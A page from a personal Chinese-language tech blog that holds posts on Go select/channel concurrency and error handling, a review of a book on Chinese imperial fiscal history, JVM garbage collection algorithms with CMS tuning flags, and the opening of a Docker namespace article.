<h2 id="for-select-loop"><a href="#for-select-loop" class="headerlink" title="for-select-loop"></a>for-select-loop</h2><p><code>select</code> 组合多个 <code>channel</code> ，<code>channel</code> 组合多个 <code>goroutine</code>。<code>select</code> 是 Go 语言并发编程中最终的指令之一，我们可以在任何上下文，无论是函数、还是多个子系统，中将多个 <code>channel</code> 组合在一起，并加入如「取消」、「限时等待」和「默认值」等功能。最简单的例子就是：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ch1, ch2 &lt;-<span class="keyword">chan</span> <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line"><span class="keyword">var</span> ch3 <span class="keyword">chan</span>&lt;- <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-ch1:</span><br><span class="line">    <span class="comment">// logic 1</span></span><br><span class="line"><span class="keyword">case</span> &lt;-ch2:</span><br><span class="line">    <span class="comment">// logic 2</span></span><br><span class="line"><span class="keyword">case</span> ch3&lt;- <span class="keyword">struct</span>&#123;&#125;&#123;&#125;:</span><br><span class="line">    <span class="comment">// logic 3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>与 <code>switch</code> 不同的是，多个 <code>case</code> 不是同步判断是否满足条件，而是异步判断，如果所有 <code>case</code> 都不满足，那么 <code>select</code> 语句将一直阻塞。、</p>
<p><code>for-select-loop</code> 是 Go 语言中最常见的使用方法，可以被应用在多个场景中：</p>
<p>顺序写入变量到 <code>channel</code>：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> _, str := <span class="keyword">range</span> []<span class="keyword">string</span>&#123;<span class="string">"str1"</span>, <span class="string">"str2"</span>, <span class="string">"str3"</span>&#125; &#123;</span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> &lt;-stop:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">case</span> strChan&lt;- str:</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>无限循环执行任务直到被取消：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>&#123;</span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> &lt;-stop:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">default</span>：</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 循环任务</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h2><p>并发编程中，错误处理非常困难。我们花费大量时间思考多个线程之间的内存共享和协调，但是忽略如何优雅地处理错误。Go 语言抛弃了在其他语言中常见的异常抛出机制，并提出开发者应该给予错误处理逻辑分支与正产流程相同的关注。在错误处理汇总最基本的问题是「谁应该处理错误？」。有时候，程序需要停止进一步沿着调用栈向上传递异常，而是处理异常。</p>
<p>在并发编程中，这个问题会变得更加复杂。因为 <code>goroutine</code> 是独立于它的父亲和兄弟 goroutine 执行的，很难确定应该如何处理错误。例如：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">checkStatus := <span class="function"><span class="keyword">func</span><span class="params">(stop &lt;-<span class="keyword">chan</span> <span class="keyword">interface</span>&#123;&#125;, urls ...<span class="keyword">string</span>)</span> &lt;-<span class="title">chan</span> *<span class="title">http</span>.<span class="title">Response</span></span> &#123;</span><br><span class="line">    responses := <span class="built_in">make</span>(<span class="keyword">chan</span> *http.Response)</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">defer</span> <span class="built_in">close</span>(responses)</span><br><span class="line">        <span class="keyword">for</span> _, url := <span class="keyword">range</span> urls &#123;</span><br><span class="line">            resp, err := http.Get(url)</span><br><span class="line">            <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                fmt.Println(err)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">select</span> &#123;</span><br><span class="line">            <span class="keyword">case</span> &lt;-stop:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">case</span> responses &lt;- resp:</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    <span class="keyword">return</span> responses</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stop := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">interface</span>&#123;&#125;)</span><br><span class="line"><span class="keyword">defer</span> <span class="built_in">close</span>(stop)</span><br><span class="line"></span><br><span class="line">urls := []<span class="keyword">string</span>&#123;<span class="string">"https://google.com"</span>, <span class="string">"https://host"</span>&#125;</span><br><span class="line"><span class="keyword">for</span> response := <span class="keyword">range</span> checkStatus(stop, urls...) &#123;</span><br><span class="line">    fmt.Printf(<span class="string">"Response: %v\n"</span>, response.Status)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>例子中发送 http 请求的 goroutine 没有办法将错误返回，只能打印错误信息防止将错误吞掉。所以，不应该使 goroutine 无法回传错误。更好的方式是注意点分离，并发的 goroutine 应该将错误信息传递给另外一个更够访问程序全部状态的组件，并正确处理错误。如我们可以封装返回值和错误信息：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Result <span class="keyword">struct</span> &#123;</span><br><span class="line">    Error error</span><br><span class="line">    Response *http.Response</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">checkStatus := <span class="function"><span class="keyword">func</span><span class="params">(stop &lt;-<span class="keyword">chan</span> <span class="keyword">interface</span>&#123;&#125;, urls ...<span class="keyword">string</span>)</span> &lt;-<span class="title">chan</span> *<span class="title">http</span>.<span class="title">Response</span></span> &#123;</span><br><span class="line">    results := <span class="built_in">make</span>(<span class="keyword">chan</span> Result)</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">defer</span> <span class="built_in">close</span>(results)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> _, url := <span class="keyword">range</span> urls &#123;</span><br><span class="line">            resp, err := http.Get(url)</span><br><span class="line">            result = Result&#123;Error: err, Response: resp&#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">select</span> &#123;</span><br><span class="line">            <span class="keyword">case</span> &lt;-stop:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">case</span> results &lt;- result:</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    <span class="keyword">return</span> results</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stop := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">interface</span>&#123;&#125;)</span><br><span class="line"><span class="keyword">defer</span> <span class="built_in">close</span>(stop)</span><br><span class="line"></span><br><span class="line">urls := []<span class="keyword">string</span>&#123;<span class="string">"https://google.com"</span>, <span class="string">"https://host"</span>&#125;</span><br><span class="line"><span class="keyword">for</span> result := <span class="keyword">range</span> checkStatus(stop, urls...) &#123;</span><br><span class="line">    <span class="keyword">if</span> result.Error != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Printf(<span class="string">"error: %v"</span>, result.Error)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Printf(<span class="string">"Response: %v\n"</span>, result.Response.Status)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这种方式的关键在于我们将可能的结果和错误封装在一起，可能够表示 <code>checkStatus</code> 所能够产生的全部结果，而使我们的主流程可能决定应该处理错误情况。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://chuanleiguo.com/2018/10/05/%E4%B8%AD%E5%A4%AE%E5%B8%9D%E5%9B%BD%E7%9A%84%E8%B4%A2%E6%94%BF%E5%AF%86%E7%A0%81/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Chuanlei Guo">
      <meta itemprop="description" content="正因为未知，人与人之间的羁绊才愈发迷人">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Chuan's Cabin">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2018/10/05/%E4%B8%AD%E5%A4%AE%E5%B8%9D%E5%9B%BD%E7%9A%84%E8%B4%A2%E6%94%BF%E5%AF%86%E7%A0%81/" class="post-title-link" itemprop="url">中央帝国的财政密码</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2018-10-05 10:05:30" itemprop="dateCreated datePublished" datetime="2018-10-05T10:05:30+08:00">2018-10-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-06-26 10:22:16" itemprop="dateModified" datetime="2020-06-26T10:22:16+08:00">2020-06-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/booknotes/" itemprop="url" rel="index"><span itemprop="name">读书笔记</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Disqus：</span>
    
    <a title="disqus" href="/2018/10/05/%E4%B8%AD%E5%A4%AE%E5%B8%9D%E5%9B%BD%E7%9A%84%E8%B4%A2%E6%94%BF%E5%AF%86%E7%A0%81/#disqus_thread" itemprop="discussionUrl">
      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/10/05/中央帝国的财政密码/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><img src="/images/2018-10-05/cover.jpg" alt="中央帝国的财政密码"></p>
<p>因为对历史感兴趣，所以我希望从各个角度审视中国历史，所以选择到了这本⎡中央帝国的财政密码⎦。书的作者叫郭建龙，曾经是财政记者，多年的采访与资料收集使他能从财政的角度分析中国的现实。书的内容以分析中华帝国的历代的财政为主，却也通过回看历史来分析当前的中央经济改革。作者认为中国经济的三大底线是：国有企业不放弃、公有土地制度不触及、政府控制发钞权。我们通常认为这是社会主义的特征，是从马克思开始就决定要必须守住的三大基础。但是作者通过回看历史发现，其实，这所谓三大基础并非舶来品，而是中国历史上一直依赖的手段，中国古代的各个王朝已经频繁使用国有企业、公有土地制度、垄断货币发行的手段敛财，这些手段不是从外国学来的理论，而是传统带来的本能。</p>
<p>本书将中国的历史依据制度和财政的传承性分为三个周期：</p>
<ol>
<li>第一个周期以官僚制度上以中央集权为主，残存一定的诸侯制；经济上实行土地私有制，财政税收最初以土地税为主，逐渐开辟出国有企业、金融垄断与卖官鬻爵。这个周期始于秦汉，结束于南朝。</li>
<li>第二个周期的制度特征是较为完善的中央集权制和科举制，经济上采用土地公有制，税收上实行较为复杂的租用调制，并辅以政府机关的自我经营。这个周期从北魏开始，结束于南宋。</li>
<li>第三个周期的特征是土地制度重回私有制，官僚制度上建立起了具有无限控制力的集权模式，并依靠封锁人们的求知欲形成了巨大的稳定性。这个周期在财政上是保守的，以土地税为主，放弃了纸币体系，回顾原始货币体系。这个周期从辽金出现萌芽，在元代继续发展，到了明清两代形成了稳定的模式。</li>
</ol>
<p>这每个周期都包含若干个朝代，第一个朝代往往从混乱中建立新的官僚和财政制度，形成基础；在后来的朝代中即使出现了改朝换代，却往往没有彻底推翻前朝的制度基础，在管制、财政上有很强的继承性，所以被视为周期的延续；直到周期的最后一个朝代，巨大的社会崩溃引起社会基础的全面改变，才会被新的周期所取代。</p>
<p>汉代最初面对强大的诸侯制残余和崩溃的经济结构，他们采取了鼓励自由经济，并逐渐从财政上收缩诸侯权利的做法，并取得了成功，形成了初步的中央集权。但到了汉武帝时期，由于战争财政的需要，建立了国有企业和金融垄断，并以破坏正常官制为代价加强中央集权。王莽时期，政府进行了激烈的、带着计划经济色彩的财金计划，但是由于政府干预对社会经济的破坏太大，导致了政府垮台。</p>
<p>东汉继承了西汉的社会经济结构，也全盘接收西汉的社会弊病。由于官商结构的发展，东汉出现了板结的社会分层，这种分层一致持续到魏晋南朝，严重到影响政权存续。第一周期由于户籍人口消失、财税不足，政府变得羸弱不堪，最终因丧失了调整能力而崩塌。</p>
<p>北魏出现了土地公有制，历经西魏、北周和隋，到了唐初，形成了以政府分配和回收土地为特征的公有制。但是唐代的土地公有制去很快失败了。唐代的土地公有制崩溃直接影响了税收，此外政府必须同时统计人口、土地和家庭，由于这超出了当时政府的统计能力，对财政照成了巨大的拖累。所以，唐代虽然经济大发展，财政却不健康，这导致了安史之乱。唐代后期进行了土地私有制改革，加强专卖制度，形成了庞大的国有垄断经济。这些特征传给了五代、两宋，并在宋代形成了庞大的政府垄断。</p>
<p>宋代，因为高昂的战争和养官成本，需要庞大的财政支持，形成了中国离殇上最壮观的专卖制度，并开创了有历史性意义的纸币实验。纸币最初由民间发行，后由政府将发行权收归国有，并发现了纸币巨大的财富再分配效应。从这时开始，后代政府都通过纸币从民间吸取财富，形成了世界上最早的一系列恶性通货膨胀。</p>
<p>从辽金开始，土地制度重回私有制，放弃了不稳定的纸币系统，回归原始的货币制度，但是这套制度又足够简单，足以维持很长时间。实际上，清朝的经济一直处于高速发展中。但是到了清末，随着海外影响的到来，中国财政才开始了近代化的路程，并有了突破农业社会桎梏的机会。</p>
<p>这本书不仅仅是回顾古代，而且通过研究古代问题来研究现代。了解了古代的财政逻辑之后，再看待现代问题，就有个更广阔的视角。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://chuanleiguo.com/2018/10/05/JVM%E5%9E%83%E5%9C%BE%E6%94%B6%E9%9B%86%E7%AE%97%E6%B3%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Chuanlei Guo">
      <meta itemprop="description" content="正因为未知，人与人之间的羁绊才愈发迷人">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Chuan's Cabin">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2018/10/05/JVM%E5%9E%83%E5%9C%BE%E6%94%B6%E9%9B%86%E7%AE%97%E6%B3%95/" class="post-title-link" itemprop="url">JVM 垃圾收集算法</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2018-10-05 09:10:46" itemprop="dateCreated datePublished" datetime="2018-10-05T09:10:46+08:00">2018-10-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-06-26 10:22:16" itemprop="dateModified" datetime="2020-06-26T10:22:16+08:00">2020-06-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/programming-language/" itemprop="url" rel="index"><span itemprop="name">编程语言</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Disqus：</span>
    
    <a title="disqus" href="/2018/10/05/JVM%E5%9E%83%E5%9C%BE%E6%94%B6%E9%9B%86%E7%AE%97%E6%B3%95/#disqus_thread" itemprop="discussionUrl">
      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/10/05/JVM垃圾收集算法/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>垃圾收集（Garbage collection, GC）是 Java 流行的重要原因。GC 是一种能够自动回收不用内存的机制。本质上，GC 追踪所有正在被使用的对象，并将剩余对象标记为「垃圾」（garbage）。因为程序员不需要刻意将对象标记为「可回收」，所以 Java 的 GC 被认为是自动内存管理模式。GC 以低优先级线程运行。</p>
<h2 id="对象生命周期"><a href="#对象生命周期" class="headerlink" title="对象生命周期"></a>对象生命周期</h2><p>JVM 中对象的生命周期可以被分为3个阶段：</p>
<ol>
<li>对象创建（Object creation）</li>
</ol>
<p>创建对象通常使用 <code>new</code> 关键字：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object obj = <span class="keyword">new</span> Object();</span><br></pre></td></tr></table></figure>
<p>当对象创建完成后，操作系统会分配特定大小的内存来保存对象。分配的内存大小与操作系 统体系结构以及 JVM 种类有关。</p>
<ol start="2">
<li>对象使用（Object in use）</li>
</ol>
<p>在这个阶段，对象正在被应用程序的其他对象使用（其他对象有指向该对象的引用）。此时，对象被保存在内存中并且可能持有指向其他对象的引用。</p>
<ol start="3">
<li>对象销毁（Object destruction）</li>
</ol>
<p>GC 系统检测每个对象，并做引用计数。当没有引用指向某个对象时，挡圈运行的程序没有任何方法可以访问该对象，所以就可以回收该对象所占用的内存。</p>
<h2 id="垃圾收集算法"><a href="#垃圾收集算法" class="headerlink" title="垃圾收集算法"></a>垃圾收集算法</h2><p>对象有程序员编写的代码，以及为了使用框架所提供的特性而创建，但是不需要显式地回收内存。内存的回收由运行在 JVM 层级的垃圾收集器完成。在 JVM 的进化过程中出现了很多垃圾收集算法。</p>
<h3 id="标记-清除（Mark-and-sweep）"><a href="#标记-清除（Mark-and-sweep）" class="headerlink" title="标记-清除（Mark and sweep）"></a>标记-清除（Mark and sweep）</h3><p><strong>标记-清除</strong> 是最初也是最基本的垃圾收集算法，它有两个阶段：</p>
<ol>
<li>标记活跃对象</li>
<li>删除不可达对象</li>
</ol>
<p>在开始，GC 定义了一些特定对象，被称为<strong>根对象</strong>（Garbage Collection Roots），如：本地变量、当前执行方法、活跃线程、类静态域的输入参数等。GC 从根对象开始，沿着指向其他对象的引用遍历内存中的所有对象，将所有访问到的对象标记为「存活」。</p>
<blockquote>
<p>在运行标记算法时，应用程序需要暂停运行，因为无法遍历不断变化的引用图。这被称为 <strong>Stop The World pause</strong>。</p>
</blockquote>
<p>第二个阶段清理内存。这一步可以用多种方法实现：</p>
<ol>
<li><strong>普通删除</strong>（Normal deletion）：释放没有被引用的对象所占用的内存，不修改被引用的对象。memory allocator 保存着指向可以创建对象的空闲内存区域。这通常被称为<strong>标记-清除</strong>算法。</li>
</ol>
<p><img src="/images/2018-10-05/Normal-Deletion-Mark-and-Sweep.png" alt="Normal-Deletion.png"></p>
<ol start="2">
<li><strong>删除-整理</strong>（Deletion with compacting）：仅仅删除无用的对象是不够的，因为空闲内存以碎片的形式分布在内存中，如果创建较大的对象，但是却无法找到足够大的连续内存空间，则可能抛出 <code>OutOfMemoryError</code> 。<br> 为了解决这个问题，在删除无用对象后，会将存活的对象所占内存合并，以消除内存碎片。这使得分配新内存更容易也更快。这通常被称为<strong>标记-整理</strong>算法，</li>
</ol>
<p><img src="/images/2018-10-05/Deletion-with-compacting.png" alt="Deletion-with-compacting.png"></p>
<ol start="3">
<li><strong>删除-复制</strong>（Deletion with copying）：这与标记-整理算法相似，它们都移动内存中存活对象的位置。不同之处在于，删除-复制算法将对象移动到不同的区域。</li>
</ol>
<p><img src="/images/2018-10-05/Deletion-with-copying-Mark-and-Sweep.png" alt="Deletion-with-copying-Mark-and-Sweep.png"></p>
<h3 id="并发标记删除垃圾收集（Concurrent-mark-sweep，CMS）"><a href="#并发标记删除垃圾收集（Concurrent-mark-sweep，CMS）" class="headerlink" title="并发标记删除垃圾收集（Concurrent mark sweep，CMS）"></a>并发标记删除垃圾收集（Concurrent mark sweep，CMS）</h3><p>CMS 在本质上是对标记清除算法的升级。它使用多个线程扫描堆内存。它可以利用现代计算机多核的结构，在性能上有显著提升。</p>
<p>CMS 通过与应用程序线程并发地进行垃圾收集，尝试最小化程序的停顿时间。它在新生代使用并行的<strong>标记-复制</strong>算法，在老年代使用并发的<strong>标记-清除</strong>算法。</p>
<p>为了开启 CMS ，需要设置 JVM 的参数：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-XX:+UserConcMarkSweepGC</span><br></pre></td></tr></table></figure>

<h4 id="CMS-的优化选项"><a href="#CMS-的优化选项" class="headerlink" title="CMS 的优化选项"></a>CMS 的优化选项</h4><table>
<thead>
<tr>
<th>FLAG</th>
<th>DESCRIPTION</th>
</tr>
</thead>
<tbody><tr>
<td>-XX:+UseCMSInitiating\OccupancyOnly</td>
<td>Indicates that you want to solely use occupancy as a criterion for starting a CMS collection operation.</td>
</tr>
<tr>
<td>-XX:CMSInitiating\OccupancyFraction=70</td>
<td>Sets the percentage CMS generation occupancy to start a CMS collection cycle.</td>
</tr>
<tr>
<td>-XX:CMSTriggerRatio=70</td>
<td>This is the percentage of MinHeapFreeRatio in CMS generation that is allocated prior to a CMS cycle starts.</td>
</tr>
<tr>
<td>-XX:CMSTriggerPermRatio=90</td>
<td>Sets the percentage of MinHeapFreeRatio in the CMS permanent generation that is allocated before starting a CMS collection cycle.</td>
</tr>
<tr>
<td>-XX:CMSWaitDuration=2000</td>
<td>Use the parameter to specify how long the CMS is allowed to wait for young collection.</td>
</tr>
<tr>
<td>-XX:+UseParNewGC</td>
<td>Elects to use the parallel algorithm for young space collection.</td>
</tr>
<tr>
<td>-XX:+CMSConcurrentMTEnabled</td>
<td>Enables the use of multiple threads for concurrent phases.</td>
</tr>
<tr>
<td>-XX:ConcGCThreads=2</td>
<td>Sets the number of parallel threads used for the concurrent phases.</td>
</tr>
<tr>
<td>-XX:ParallelGCThreads=2</td>
<td>Sets the number of parallel threads you want used for stop-the-world phases.</td>
</tr>
<tr>
<td>-XX:+CMSIncrementalMode</td>
<td>Enable the incremental CMS (iCMS) mode.</td>
</tr>
<tr>
<td>-XX:+CMSClassUnloadingEnabled</td>
<td>If this is not enabled, CMS will not clean permanent space.</td>
</tr>
<tr>
<td>-XX:+ExplicitGCInvokes\Concurrent</td>
<td>This allows System.gc() to trigger concurrent collection instead of a full garbage collection cycle.</td>
</tr>
</tbody></table>
<h3 id="G1-垃圾收集器"><a href="#G1-垃圾收集器" class="headerlink" title="G1 垃圾收集器"></a>G1 垃圾收集器</h3><p>G1（Garbage First）从 Java7 开始可用，并希望在未来逐渐替代 CMS。目前，在 Java8中，G1 是默认的垃圾收集器。G1 是并行、并发、分代收集、低停顿的垃圾收集器。</p>
<p>G1 将按区（region）将堆分割，每个 region 的大小通常为 2048 字节。每个 region 可能是新生代或老年代（新生代又被分为 eden 和 survivor region）。这允许 GC 不需要一次对整个堆进行垃圾回收，而是可以增量地进行。这意味着一次只在一部分 region 上进行垃圾回收。</p>
<p><img src="/images/2018-10-05/Memory-regions-marked-G1.png" alt="Memory-regions-marked-G1.png"></p>
<p>G1 追踪每个 region 中包含的存活数据的数量。追踪的结果被用于觉得那些 region 中 garbage 最多，最多的被最先回收。</p>
<p>和其他算法一样，整理的操作也会暂停程序的运行。但是我们可以配置暂停时间。G1将尽可能的满足配置。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://chuanleiguo.com/2018/08/05/Docker-Namespace-Cgroup/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Chuanlei Guo">
      <meta itemprop="description" content="正因为未知，人与人之间的羁绊才愈发迷人">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Chuan's Cabin">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2018/08/05/Docker-Namespace-Cgroup/" class="post-title-link" itemprop="url">Docker 基础知识之 Namespace, Cgroup</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2018-08-05 22:14:46" itemprop="dateCreated datePublished" datetime="2018-08-05T22:14:46+08:00">2018-08-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-06-26 10:22:16" itemprop="dateModified" datetime="2020-06-26T10:22:16+08:00">2020-06-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/computer-science/" itemprop="url" rel="index"><span itemprop="name">计算机科学</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Disqus：</span>
    
    <a title="disqus" href="/2018/08/05/Docker-Namespace-Cgroup/#disqus_thread" itemprop="discussionUrl">
      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/08/05/Docker-Namespace-Cgroup/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>最近工作上需要使用 Docker，在阅读「<a href="https://www.amazon.cn/dp/B01E5P05KU/ref=sr_1_1?s=books&ie=UTF8&qid=1532857475&sr=1-1&keywords=第一本docker书" target="_blank" rel="noopener">第一本 Docker 书</a>」后了解了如何成为 Docker 的用户，但对 Docker 中用到技术却不甚了解。都说 Docker 是「新瓶装旧球」，文中笔者将学习到的 Docker 基础技术中的 Namespace，Cgroup 与 AUFS 记录如下。</p>
<h2 id="Namespace"><a href="#Namespace" class="headerlink" title="Namespace"></a>Namespace</h2><p>Linux Namespace 是 Linux 内核提供的一个功能，可以实现系统资源的隔离，如：PID、User ID、Network 等。Linux 中的 chroot 命令可以将当前目录设置为根目录，使得用户的操作被限制在当前目录之下而不影响其他目录。</p>
